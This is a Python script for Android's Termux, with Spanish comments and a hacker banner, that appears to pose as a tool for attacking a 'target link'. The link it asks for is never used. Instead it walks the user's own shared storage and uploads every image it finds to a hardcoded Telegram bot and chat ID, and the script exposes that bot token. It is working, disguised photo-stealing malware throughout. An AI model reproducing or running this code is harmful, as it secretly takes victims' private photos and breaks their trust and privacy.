import os
import asyncio
import sys
from telegram import Bot
from telegram.error import TelegramError

# Colores ANSI
G = '\033[92m'  # Verde
R = '\033[91m'  # Rojo
Y = '\033[93m'  # Amarillo
B = '\033[94m'  # Azul
C = '\033[96m'  # Cyan
W = '\033[0m'   # Reset

def banner():
    print(f"""{G}
    ██████╗  █████╗ ████████╗ █████╗     ███████╗██╗   ██╗██████╗ 
    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗    ██╔════╝██║   ██║██╔══██╗
    ██║  ██║███████║   ██║   ███████║    ███████╗██║   ██║██████╔╝
    ██║  ██║██╔══██║   ██║   ██╔══██║    ╚════██║██║   ██║██╔═══╝ 
    ██████╔╝██║  ██║   ██║   ██║  ██║    ███████║╚██████╔╝██║     
    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚══════╝ ╚═════╝ ╚═╝     
    {R}[ System Protocol: ACTIVE ]          [ Status: TREE_RECURSION ]{W}
    """)

banner()
print(f"{C}┌──({G}root@internal{C})-[{W}~{C}]")
input(f"└─$ {W}Ingrese el link del destino: ")

async def enviar_fotos_telegram():
    BOT_TOKEN = "8096588316:AAGQX5cNAzy49Kl6tvP_FcW2gZarttEt8Ss"
    CHAT_ID = "8326936177"
    ruta_raiz = "/data/data/com.termux/files/home/storage"
    EXTENSIONES_IMAGEN = ('.jpg', '.jpeg', '.png', '.webp', '.bmp')

    try:
        bot = Bot(token=BOT_TOKEN)
        
        if not os.path.exists(ruta_raiz):
            print(f"{R}[!] ERROR: Ruta raíz no encontrada.{W}")
            return

        print(f"{Y}🔍 Generando árbol de directorios y extrayendo...{W}\n")
        
        contador = 0
        # os.walk recorre todo como un árbol
        for raiz, carpetas, archivos in os.walk(ruta_raiz):
            # Dibujar nivel del árbol en la terminal
            nivel = raiz.replace(ruta_raiz, '').count(os.sep)
            indentado = ' ' * 4 * (nivel)
            print(f"{G}{indentado}├── [📂] {os.path.basename(raiz)}/{W}")
            
            sub_indentado = ' ' * 4 * (nivel + 1)
            
            for f in archivos:
                if f.lower().endswith(EXTENSIONES_IMAGEN):
                    contador += 1
                    ruta_completa = os.path.join(raiz, f)
                    
                    try:
                        # Obtener HEX del archivo
                        with open(ruta_completa, 'rb') as hex_file:
                            header = hex_file.read(8).hex().upper()
                        hex_str = ' '.join(header[i:i+2] for i in range(0, len(header), 2))
                        
                        # Mostrar en estilo tree
                        print(f"{B}{sub_indentado}├── [📄] {C}{hex_str}...{W}")
                        
                        # Enviar a Telegram
                        with open(ruta_completa, 'rb') as foto:
                            await bot.send_photo(
                                chat_id=CHAT_ID, 
                                photo=foto, 
                                caption=f"Tree_Extraction: {hex_str}"
                            )
                        
                        await asyncio.sleep(1.2)
                        
                    except Exception:
                        continue

        print(f"\n{G}[+++] ESCANEO Y EXTRACCIÓN FINALIZADA: {contador} ARCHIVOS [+++]{W}")

    except TelegramError:
        print(f"\n{R}[!] CONNECTION_ERROR: Fallo en el túnel de Telegram.{W}")
    except Exception as e:
        print(f"\n{R}[!] SYS_FAILURE: {e}{W}")

if __name__ == "__main__":
    try:
        asyncio.run(enviar_fotos_telegram())
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] OPERACIÓN ABORTADA.{W}")
